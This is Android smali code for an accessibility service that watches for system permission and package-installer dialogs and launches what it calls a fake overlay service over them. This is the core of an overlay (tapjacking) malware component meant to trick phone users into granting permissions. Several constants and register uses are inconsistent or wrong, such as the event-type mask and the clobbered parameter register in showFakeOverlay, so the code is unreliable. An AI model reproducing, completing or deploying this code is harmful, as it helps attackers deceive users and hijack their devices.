.class public Lcom/ddl/PermissionMonitor;
.super Landroid/accessibilityservice/AccessibilityService;
.source "PermissionMonitor.java"

# Watches for Android permission dialogs and triggers the overlay

.field private overlayIntent:Landroid/content/Intent;

.method public onServiceConnected()V
    .locals 3

    # Configure accessibility service at runtime
    new-instance v0, Landroid/accessibilityservice/AccessibilityServiceInfo;
    invoke-direct {v0}, Landroid/accessibilityservice/AccessibilityServiceInfo;-><init>()V

    # eventTypes = TYPE_WINDOW_STATE_CHANGED(1) | TYPE_WINDOW_CONTENT_CHANGED(2048)
    const v1, 0x801
    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->eventTypes:I

    # feedbackType = FEEDBACK_GENERIC(0x1F)
    const/16 v1, 0x1F
    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->feedbackType:I

    # notificationTimeout = 100ms
    const/16 v1, 0x64
    iput-wide v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->notificationTimeout:J

    # flags = FLAG_REPORT_VIEW_IDS(16)
    const/16 v1, 0x10
    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService;->setServiceInfo(Landroid/accessibilityservice/AccessibilityServiceInfo;)V

    return-void
.end method

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 5

    # eventType = event.getEventType()
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I
    move-result v0

    # Only handle TYPE_WINDOW_STATE_CHANGED = 0x20
    const/16 v1, 0x20
    if-ne v0, v1, :skip

    # packageName = event.getPackageName()
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;
    move-result-object v2

    if-eqz v2, :skip

    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v2

    # Permission controller packages we want to intercept
    const-string v3, "com.android.permissioncontroller"
    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v3
    if-nez v3, :trigger

    const-string v3, "com.android.packageinstaller"
    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v3
    if-nez v3, :trigger

    const-string v3, "com.google.android.permissioncontroller"
    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v3
    if-nez v3, :trigger

    goto :skip

    :trigger
    # className = event.getClassName()
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;
    move-result-object v3
    if-eqz v3, :skip

    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v3

    # Only trigger on Activity windows (permission dialogs are activities)
    const-string v4, "Activity"
    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-eqz v4, :skip

    invoke-direct {p0}, Lcom/ddl/PermissionMonitor;->showFakeOverlay()V

    :skip
    return-void
.end method

.method private showFakeOverlay()V
    .locals 2
    :try_start
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/ddl/OverlayService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
    const/16 v2, 0x1A      # 26
    if-lt v1, v2, :start_service
    invoke-virtual {p0, v0}, Lcom/ddl/PermissionMonitor;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    goto :done
    :start_service
    invoke-virtual {p0, v0}, Lcom/ddl/PermissionMonitor;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :done
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :done
    return-void
.end method

.method public onInterrupt()V
    .locals 0
    return-void
.end method
